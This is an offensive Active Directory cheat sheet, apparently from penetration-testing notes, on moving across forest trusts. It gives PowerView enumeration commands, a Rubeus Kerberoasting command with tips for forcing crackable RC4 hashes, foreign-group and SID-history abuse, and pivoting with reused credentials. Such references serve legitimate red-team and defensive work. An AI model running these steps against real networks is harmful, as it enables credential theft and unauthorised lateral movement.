## Cross-Forest Account Enumeration

You have an inbound or bidirectional forest trust and need to identify high-value targets with SPNs in the remote forest,.

List accounts with associated SPNs in the target domain using PowerView

```
Get-DomainUser -SPN -Domain <DOMAIN> | select SamAccountName
```

Verify group membership for a specific identity in the target domain to confirm high-privilege status

```
Get-DomainUser -Domain <DOMAIN> -Identity <USERNAME> | select samaccountname,memberof
```

- **Gotchas**: **Target domain connectivity** must be functional over LDAP for PowerView to resolve attributes across the trust,.

## Cross-Forest Kerberoasting

Service accounts in a trusted forest are identified as members of privileged groups like Domain Admins,.

Request a TGS for a specific user in the target domain and output the hash for offline cracking

```
.\Rubeus.exe kerberoast /domain:<DOMAIN> /user:<USERNAME> /nowrap
```

- **Dangerous / misconfigured settings**:
    - Bidirectional forest trusts allowing authentication requests to traverse boundaries.
    - Service accounts with RC4_HMAC supported ETypes.
- **Gotchas**: **AES-enabled accounts** will return AES hashes by default; use `/ticket:X` or `/tgtdeleg` to force RC4 if the hash is uncrackable.

## Foreign Group Membership Abuse

A bidirectional trust is active and security principals from the current forest may have been nested into groups in the target forest,.

Enumerate groups in the target domain containing members from outside that domain

```
Get-DomainForeignGroupMember -Domain <DOMAIN>
```

Resolve a foreign SID found in a group to a readable name

```
Convert-SidToName <SID>
```

Authenticate to the target forest using confirmed cross-forest administrative credentials

```
Enter-PSSession -ComputerName <DC_IP> -Credential <DOMAIN>\<USERNAME>
```

- **Dangerous / misconfigured settings**:
    - **Domain Local Groups** allowing security principals from external forests as members.
- **Gotchas**: **Inbound-only trusts** will prevent the use of current forest credentials to access the target, even if the group membership exists.

## SID History Abuse

A user has been migrated between forests and you have control over the migrated account in the new forest.

- **When to use**: Migration scenarios where the user needs to retain access to resources in the original forest.
- **Dangerous / misconfigured settings**:
    - **SID Filtering disabled** on the forest trust, which allows the SID history attribute to be honored during cross-forest authentication.
- **Edge cases**: If administrative SIDs from Forest A are added to a user's SID history in Forest B, that user gains those privileges in Forest A.
- **Gotchas**: **SID Filtering enabled** is the default security boundary; if active, it strips the SID history attribute and the attack fails.

## Cross-Forest Password Reuse

Administrative accounts in Forest A and Forest B are managed by the same personnel and follow similar naming conventions.

- **When to use**: You have compromised a Domain Admin in Forest A and want to pivot to Forest B without additional exploits.
- **Commands**: Verify credential validity across the trust boundary

```
Enter-PSSession -ComputerName <DC_IP> -Credential <DOMAIN>\<USERNAME>
```

- **Edge cases**: Naming conventions may differ slightly (e.g., `adm_user` vs `user_admin`), but passwords often remain identical.
- **Gotchas**: **Account lockout policies** may trigger if the password has been rotated in one forest but not the other.